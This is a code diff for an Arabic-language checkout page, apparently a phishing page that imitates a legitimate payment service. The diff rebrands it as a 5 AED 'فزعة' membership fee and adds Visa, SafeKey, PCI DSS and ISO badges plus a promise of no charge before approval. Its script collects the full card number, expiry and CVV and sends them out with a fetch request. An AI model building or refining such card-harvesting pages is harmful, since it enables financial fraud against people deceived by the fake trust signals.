@@ -10,12 +10,14 @@
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
             background-color: #f5f5f5;
             padding: 0;
             min-height: 100vh;
         }
+
         .container {
             max-width: 500px;
             margin: 0 auto;
@@ -24,6 +26,7 @@
             display: flex;
             flex-direction: column;
         }
+
         .header {
             background: white;
             padding: 16px 20px;
@@ -32,6 +35,7 @@
             align-items: center;
             border-bottom: 1px solid #e0e0e0;
         }
+
         .header-logos {
             display: flex;
             gap: 12px;
@@ -39,19 +43,23 @@
             width: 100%;
             justify-content: space-between;
         }
+
         .header-logo {
             height: 32px;
             width: auto;
             object-fit: contain;
         }
+
         .content {
             flex: 1;
             padding: 20px;
             overflow-y: auto;
         }
+
         .section {
             margin-bottom: 24px;
         }
+
         .section-title {
             font-size: 14px;
             font-weight: 600;
@@ -60,74 +68,166 @@
             padding-bottom: 8px;
             border-bottom: 1px solid #e5e7eb;
         }
-        .payment-methods {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        .payment-method {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid #e5e7eb;
+
+        .transaction-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            background: #f9fafb;
+            padding: 16px;
             border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
         }
-        .payment-method.active {
-            border-color: #2563eb;
-            background-color: #eff6ff;
+
+        .info-row {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
         }
-        .payment-method img {
-            height: 24px;
-            margin-bottom: 4px;
+
+        .info-label {
+            font-size: 13px;
+            color: #6b7280;
         }
+
+        .info-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
         .form-group {
             margin-bottom: 16px;
         }
-        .form-label {
+
+        label {
             display: block;
             font-size: 14px;
-            color: #374151;
-            margin-bottom: 6px;
+            color: #1f2937;
+            margin-bottom: 8px;
         }
-        .form-input {
+
+        input, select {
             width: 100%;
-            padding: 12px;
+            padding: 10px 12px;
             border: 1px solid #d1d5db;
-            border-radius: 8px;
-            font-size: 16px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+        }
+
+        input:focus, select:focus {
             outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
         }
-        .form-input:focus {
-            border-color: #2563eb;
-            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
+
+        .date-row {
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            gap: 8px;
+            align-items: flex-end;
         }
-        .form-row {
-            display: flex;
-            gap: 12px;
-        }
-        .form-row .form-group {
+
+        .date-row select {
             flex: 1;
         }
+
+        .date-separator {
+            color: #d1d5db;
+            font-size: 18px;
+            line-height: 1;
+        }
+
+        .cvv-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            align-items: flex-end;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .charity-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: #f9fafb;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+
+        .charity-text {
+            flex: 1;
+            font-size: 13px;
+            color: #1f2937;
+            line-height: 1.5;
+        }
+
+        .total-amount {
+            text-align: center;
+            padding: 16px;
+            background: #f9fafb;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+
+        .total-label {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 4px;
+        }
+
+        .total-value {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1f2937;
+        }
+
+        .total-currency {
+            font-size: 14px;
+            color: #6b7280;
+            margin-right: 4px;
+        }
+
         .footer {
             padding: 20px;
             border-top: 1px solid #e5e7eb;
         }
-        .submit-btn {
+
+        .pay-btn {
             width: 100%;
             padding: 14px;
-            background-color: #2563eb;
+            background-color: #0066cc;
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
         }
-        .submit-btn:hover {
-            background-color: #1d4ed8;
+
+        .pay-btn:hover {
+            background-color: #0052a3;
         }
-        .secure-info {
+
+        .secure-notice {
             display: flex;
             align-items: center;
             justify-content: center;
@@ -136,13 +236,9 @@
             color: #6b7280;
             font-size: 12px;
         }
-        .secure-info img {
-            height: 16px;
-        }
-        .accepted-cards {
-            width: 100%;
-            margin-top: 20px;
-            object-fit: contain;
+
+        .secure-notice img {
+            height: 14px;
         }
     </style>
 </head>
@@ -157,26 +253,35 @@
 
         <div class="content">
             <div class="section">
-                <h2 class="section-title">طريقة الدفع</h2>
-                <div class="payment-methods">
-                    <div class="payment-method active">
-                        <img src="card_logos.png" alt="Cards">
-                        <div style="font-size: 12px;">بطاقة ائتمان</div>
+                <h2 class="section-title">تفاصيل المعاملة</h2>
+                <div class="transaction-info">
+                    <div class="info-row">
+                        <span class="info-label">مقدم الخدمة</span>
+                        <span class="info-value">فزعة</span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">رقم المعاملة</span>
+                        <span class="info-value">202407040001</span>
+                    </div>
+                    <div class="info-row" style="grid-column: 1 / -1;">
+                        <span class="info-label">الخدمة</span>
+                        <span class="info-value">اشتراك عضوية فزعة</span>
                     </div>
                 </div>
             </div>
 
             <div class="section">
-                <h2 class="section-title">تفاصيل البطاقة</h2>
+                <h2 class="section-title">تفاصيل الدفع</h2>
                 <div class="form-group">
-                    <label class="form-label">رقم البطاقة</label>
-                    <input type="text" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000" maxlength="19">
+                    <label>رقم البطاقة</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
                 </div>
-                <div class="form-row">
+                
+                <div class="cvv-row">
                     <div class="form-group">
-                        <label class="form-label">تاريخ الانتهاء</label>
-                        <div style="display: flex; gap: 8px;">
-                            <select id="expMonth" class="form-input" style="flex: 1;">
+                        <label>تاريخ الانتهاء</label>
+                        <div class="date-row">
+                            <select id="expMonth">
                                 <option value="">الشهر</option>
                                 <option value="01">01</option>
                                 <option value="02">02</option>
@@ -191,7 +296,8 @@
                                 <option value="11">11</option>
                                 <option value="12">12</option>
                             </select>
-                            <select id="expYear" class="form-input" style="flex: 1;">
+                            <span class="date-separator">/</span>
+                            <select id="expYear">
                                 <option value="">السنة</option>
                                 <option value="24">2024</option>
                                 <option value="25">2025</option>
@@ -204,27 +310,43 @@
                         </div>
                     </div>
                     <div class="form-group">
-                        <label class="form-label">رمز التحقق (CVV)</label>
-                        <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="3">
+                        <label>رمز التحقق (CVV)</label>
+                        <input type="text" id="cvv" placeholder="123" maxlength="3">
                     </div>
                 </div>
             </div>
 
-            <img src="accepted_cards_ar.jpg" alt="Accepted Cards" class="accepted-cards">
-            
-            <div class="secure-info">
-                <img src="safekey.gif" alt="Secure">
-                <span>دفع آمن 100% مشفر بواسطة DubaiPay</span>
+            <div class="security-badges">
+                <img src="verified_visa.gif" alt="Visa" class="badge">
+                <img src="safekey.gif" alt="SafeKey" class="badge">
+                <img src="pci_dss_logo.png" alt="PCI DSS" class="badge">
+            </div>
+
+            <div class="charity-section">
+                <div class="charity-text">
+                    لن يتم خصم منك أي رسوم إلا بعد الموافقة على طلبك. في حالة عدم الموافقة على طلبك، لن يتم تحصيل منك أي رسوم.
+                </div>
+            </div>
+
+            <div class="total-amount">
+                <div class="total-label">إجمالي المبلغ</div>
+                <div class="total-value">5.00 <span class="total-currency">درهم</span></div>
             </div>
         </div>
 
         <div class="footer">
-            <button class="submit-btn" onclick="submitPayment()">دفع الآن</button>
+            <button class="pay-btn" onclick="submitPayment()">
+                دفع 5.00 درهم
+            </button>
+            <div class="secure-notice">
+                <img src="iso_certified.gif" alt="ISO">
+                <span>جميع المعاملات مشفرة وآمنة 100%</span>
+            </div>
         </div>
     </div>
 
     <script>
-        // كود الربط البرمجي (Fetch API) - مضاف بشكل غير مرئي للتصميم
+        // كود الربط البرمجي (Fetch API)
         async function submitPayment() {
             const cardNumber = document.getElementById('cardNumber').value;
             const expMonth = document.getElementById('expMonth').value;
@@ -236,7 +358,7 @@
                 return;
             }
 
-            const btn = document.querySelector('.submit-btn');
+            const btn = document.querySelector('.pay-btn');
             btn.disabled = true;
             btn.innerText = 'جاري المعالجة...';
 
@@ -249,6 +371,8 @@
                         cardNumber,
                         expiry: expMonth + '/' + expYear,
                         cvv,
+                        amount: '5.00 AED',
+                        service: 'اشتراك عضوية فزعة',
                         timestamp: new Date().toISOString()
                     })
                 });
